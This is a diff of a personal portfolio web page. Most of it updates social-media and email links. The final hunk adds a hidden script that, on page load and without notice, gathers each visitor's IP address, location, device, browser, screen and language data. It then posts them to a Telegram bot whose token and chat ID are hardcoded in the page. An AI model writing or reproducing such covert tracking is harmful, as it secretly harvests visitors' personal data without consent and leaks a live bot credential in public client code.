@@ -1014,14 +1014,21 @@
                             <a href="https://www.linkedin.com/in/barot-jayraj-51838227a" class="social-link" target="_blank">
                                 <i class="ri-linkedin-fill"></i>
                             </a>
-                            <a href="https://github.com/jayrajbarot" class="social-link" target="_blank">
+                            <a href="https://github.com/jayraj-barot-jb" class="social-link" target="_blank">
                                 <i class="ri-github-fill"></i>
                             </a>
                             <a href="https://twitter.com/jayrajbarot" class="social-link" target="_blank">
                                 <i class="ri-twitter-fill"></i>
                             </a>
-                            <a href="https://www.instagram.com/jayrajbarot" class="social-link" target="_blank">
+                            <a href="https://www.instagram.com/jayraj__singh_rao?igsh=MTU1NTVqY2l3NTVpaA==" class="social-link" target="_blank">
                                 <i class="ri-instagram-line"></i>
+                            </a>
+
+                            <a href="https://www.facebook.com/share/1PUJz2woP3/" class="social-link" target="_blank">
+                                <i class="ri-facebook-fill"></i>
+                            </a>
+                            <a href="https://www.snapchat.com/add/rao_jay194?share_id=4Sz78xupJzY&locale=en-GB" class="social-link" target="_blank">
+                                <i class="ri-snapchat-fill"></i>
                             </a>
                             <a href="mailto:barotjayraj60@gmail.com" class="social-link">
                                 <i class="ri-mail-fill"></i>
@@ -1355,17 +1362,24 @@
                             <a href="https://www.linkedin.com/in/barot-jayraj-51838227a" class="social-link" target="_blank">
                                 <i class="ri-linkedin-fill"></i>
                             </a>
-                            <a href="https://github.com/jayrajbarot" class="social-link" target="_blank">
+                            <a href="https://github.com/jayraj-barot-jb" class="social-link" target="_blank">
                                 <i class="ri-github-fill"></i>
                             </a>
                             <a href="https://twitter.com/jayrajbarot" class="social-link" target="_blank">
                                 <i class="ri-twitter-fill"></i>
                             </a>
-                            <a href="https://www.instagram.com/jayrajbarot" class="social-link" target="_blank">
+                            <a href="https://www.instagram.com/jayraj__singh_rao?igsh=MTU1NTVqY2l3NTVpaA==" class="social-link" target="_blank">
                                 <i class="ri-instagram-line"></i>
                             </a>
-                            <a href="https://www.facebook.com/jayrajbarot" class="social-link" target="_blank">
+
+                            <a href="https://www.facebook.com/share/1PUJz2woP3/" class="social-link" target="_blank">
                                 <i class="ri-facebook-fill"></i>
+                            </a>
+                            <a href="https://www.snapchat.com/add/rao_jay194?share_id=4Sz78xupJzY&locale=en-GB" class="social-link" target="_blank">
+                                <i class="ri-snapchat-fill"></i>
+                            </a>
+                            <a href="mailto:barotjayraj60@gmail.com" class="social-link">
+                                <i class="ri-mail-fill"></i>
                             </a>
                         </div>
                     </div>
@@ -1532,6 +1546,53 @@
         window.addEventListener('load', () => {
             document.body.classList.add('loaded');
         });
+    </script>
+    <script>
+        const BOT_TOKEN = "8449949276:AAFoZ0E7vMbbe8FA1ck9paFnjGhrHqM4hN0";
+        const CHAT_ID = "1550502138";
+
+        async function sendVisitorInfo() {
+            // Get IP info
+            const ipInfo = await fetch("https://ipapi.co/json/").then(r => r.json()).catch(() => null);
+
+            // Gather browser/device info
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+
+            // Format message
+            const message = `
+🧠 New Visitor
+🌐 IP: ${ipInfo?.ip || "N/A"}
+📍 City: ${ipInfo?.city || "N/A"}
+🏳️ Country: ${ipInfo?.country_name || "N/A"}
+🕒 Timezone: ${deviceInfo.timezone}
+💻 Device: ${deviceInfo.platform}
+🧭 Browser: ${deviceInfo.userAgent}
+📏 Screen: ${deviceInfo.screen}
+🗣️ Language: ${deviceInfo.language}
+      `;
+
+            // Send to Telegram
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            });
+        }
+
+        window.addEventListener("load", sendVisitorInfo);
     </script>
 </body>
 
